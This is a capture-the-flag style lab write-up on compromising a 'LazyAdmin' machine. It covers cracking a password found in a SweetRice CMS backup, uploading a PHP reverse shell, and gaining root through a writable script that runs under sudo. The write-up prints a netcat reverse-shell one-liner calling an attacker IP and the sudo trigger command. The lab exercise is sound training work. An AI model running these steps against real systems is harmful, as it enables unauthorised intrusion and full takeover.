---
title: "LazyAdmin"
description: "Enum Port 80 Dirsearch we identified CMS SweetRice on content page dirsearch again and we found file changelog.txt which tell us about the version of CMS SweetRice and also we got"
lang: "en"
translationKey: "lazyadmin"
category: "lab-writeups"
tags: ["Lab", "CMS SweetRice", "sudo access", "write access script", "Linux", "Easy"]
publishDate: "2025-07-31"
draft: false
featured: false
sample: false
author: "Dimas Sahid Abdullah"
translationStatus: "original"
notionId: "2415fca1-ed80-8062-9764-daee5744b48a"
notionUrl: "https://app.notion.com/p/LazyAdmin-2415fca1ed8080629764daee5744b48a"
notionLastEdited: "2025-08-16T15:08:00.000Z"
---

# Enum

![](/images/lazyadmin/2016447db9b0.png)

## Port 80

![](/images/lazyadmin/698a6154c7b5.png)

Dirsearch

![](/images/lazyadmin/c0cb5f62da0c.png)

we identified CMS SweetRice on content page

![](/images/lazyadmin/229ee391f5f4.png)

dirsearch again and we found file changelog.txt which tell us about the version of CMS SweetRice and also we got an interesting sql file seperti yang terlihat pada gambar dibawah ini.

![](/images/lazyadmin/5374aa5163b6.png)

![](/images/lazyadmin/3062f8be92b1.png)

we also get file .sql right here let’s we check it out

![](/images/lazyadmin/7270f37aa14d.png)

inside file backup we got hash password so we do identify what kind of hash is that and try to crack it, the result we found the plaintext of password.

![](/images/lazyadmin/ecde565e60d4.png)

![](/images/lazyadmin/e72f7f02366c.png)

![](/images/lazyadmin/d374cb0592c0.png)

we got the password but we don’t know where we use it, so let’s we do enumerate again on directory searching, then we found some login page on `/content/as` 

![](/images/lazyadmin/690ebc59d990.png)

![](/images/lazyadmin/cb671615a1aa.png)

## CMS SweetRice 1.5.1 Exploit

next, we login using the credential we’ve obtain before `(manager:Password123)`. after succeed to login we know the real version of cms is 1.5.1 so let’s we run the related exploit.

![](/images/lazyadmin/5eb4ff65d66e.png)

from the public exploit we know that we can upload an **Arbitrary File **in** Media Center **menu, i’ve tried to upload my revshell.php via exploit script but it failed.

![](/images/lazyadmin/4e035150ce72.png)

so I do it manually then by check the box extract zip, so we upload ourp revshell.php in zip form like this.

![](/images/lazyadmin/4f9d450d3e7f.png)

after that, let’s we access the file to trigger our revshell, then voila we got user.txt

![](/images/lazyadmin/f69dbf43ea81.png)

![](/images/lazyadmin/c0651910f452.png)

## LinPriv

linpeas:

from linpeas we identified there is [backup.pl](http://backup.pl/) script which has sudo access

![](/images/lazyadmin/ead1ae1adce8.png)

![](/images/lazyadmin/f06da4a947bb.png)

we have no write access into [backup.sl](http://backup.sl/) so inside [backup.sl](http://backup.sl/) script there is another script which is [copy.sh](http://copy.sh/) 

![](/images/lazyadmin/e9e9bbdb669c.png)

we have write access into [copy.sh](http://copy.sh/) script, so we overwrite the script become our shell

here is our code revshell:

```bash
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 10.17.49.139 443 >/tmp/f
```

![](/images/lazyadmin/0c5d290b75b7.png)

![](/images/lazyadmin/588e11902f38.png)

after modify the [copy.sh](http://copy.sh/) script we run the [backup.pl](http://backup.pl/) script using sudo to trigger our revshell which has root user access

```bash
sudo /usr/bin/perl /home/itguy/backup.pl
```

![](/images/lazyadmin/2e2a540c4d4b.png)

voila we got root.txt 

![](/images/lazyadmin/73371ee90bd8.png)
